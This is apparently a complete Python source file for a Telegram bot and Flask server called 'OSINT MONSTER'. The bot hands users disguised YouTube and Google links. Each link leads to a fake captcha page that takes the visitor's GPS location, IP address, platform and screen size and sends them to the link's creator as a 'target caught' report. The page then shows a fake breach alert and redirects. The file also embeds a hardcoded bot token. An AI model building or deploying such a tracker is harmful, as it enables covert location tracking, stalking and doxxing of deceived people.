import asyncio, threading, os, requests, json
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)

# --- БАЗА ДАННЫХ (Простой JSON файл) ---
DB_FILE = "stats.json"

def load_stats():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f: return json.load(f)
    return {"total_clicks": 0, "unique_ips": []}

def save_stats(stats):
    with open(DB_FILE, "w") as f: json.dump(stats, f)

# --- ГЛАВНАЯ СТРАНИЦА (Чтобы Cron-job не выдавал ошибку) ---
@app.route('/')
def home():
    return "OSINT SERVER ONLINE", 200

# --- ЛОГИКА ЛОВУШКИ ---
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #fff; transition: 0.1s; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .captcha-box { border: 1px solid #ccc; padding: 20px; cursor: pointer; background: white; border-radius: 5px; }
        .glitch { animation: shake 0.15s infinite; filter: invert(1); background: #000 !important; }
        @keyframes shake { 0% {transform: translate(1px, 1px);} 50% {transform: translate(-2px, -1px);} 100% {transform: translate(1px, 1px);} }
    </style>
</head>
<body onclick="start()">
    <div class="captcha-box">
        <input type="checkbox" id="c"> Я не робот
    </div>
<script>
async function start() {
    document.body.classList.add('glitch');
    document.getElementById('c').checked = true;
    let d = { aid: "{{ aid }}", p: navigator.platform, s: screen.width+"x"+screen.height, lure: "{{ lure }}" };
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; send(d); },
            () => { send(d); }, { enableHighAccuracy: true }
        );
    } else { send(d); }
    
    setTimeout(() => { alert("CRITICAL ERROR: SYSTEM BREACH!"); }, 500);
}
function send(d) {
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { 
        let urls = {"yt":"https://youtube.com","gg":"https://google.com"};
        location.href = urls["{{ lure }}"] || "https://google.com";
    });
}
</script>
</body>
</html>
"""

@app.route('/t/<aid>/<lure>')
def trap(aid, lure):
    # Учет клика (даже если данные не отправились)
    stats = load_stats()
    stats["total_clicks"] += 1
    save_stats(stats)
    return render_template_string(HTML_TRAP, aid=aid, lure=lure)

@app.route('/catch', methods=['POST'])
def catch():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Учет уникальных IP
    stats = load_stats()
    if ip not in stats["unique_ips"]:
        stats["unique_ips"].append(ip)
        save_stats(stats)

    report = (
        f"🚨 **ЦЕЛЬ ПОЙМАНА!**\n\n"
        f"📍 IP: `{ip}`\n"
        f"🌍 GPS: `{data.get('gps', 'Запрещено')}`\n"
        f"📱 ОС: {data.get('p')}\n"
        f"🖥 Экран: {data.get('s')}"
    )
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": data['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.add(types.KeyboardButton(text="📺 YouTube"), types.KeyboardButton(text="🔍 Google"), types.KeyboardButton(text="📊 Статистика"))
    kb.adjust(2)
    await message.answer("💀 **OSINT MONSTER v9.0**\nВыбери действие:", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "📊 Статистика")
async def show_stats(message: types.Message):
    stats = load_stats()
    await message.answer(
        f"📈 **ОБЩАЯ СТАТИСТИКА БОТА:**\n\n"
        f"🖱 Всего переходов: `{stats['total_clicks']}`\n"
        f"👤 Уникальных жертв (IP): `{len(stats['unique_ips'])}`"
    )

@dp.message(F.text.in_(["📺 YouTube", "🔍 Google"]))
async def create(message: types.Message):
    l = "yt" if "YouTube" in message.text else "gg"
    link = f"{BASE_URL}/t/{message.from_user.id}/{l}"
    await message.answer(f"✅ Ссылка готова:\n`{link}`")

async def main():
    # Запуск сервера Flask
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
    # Запуск бота
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
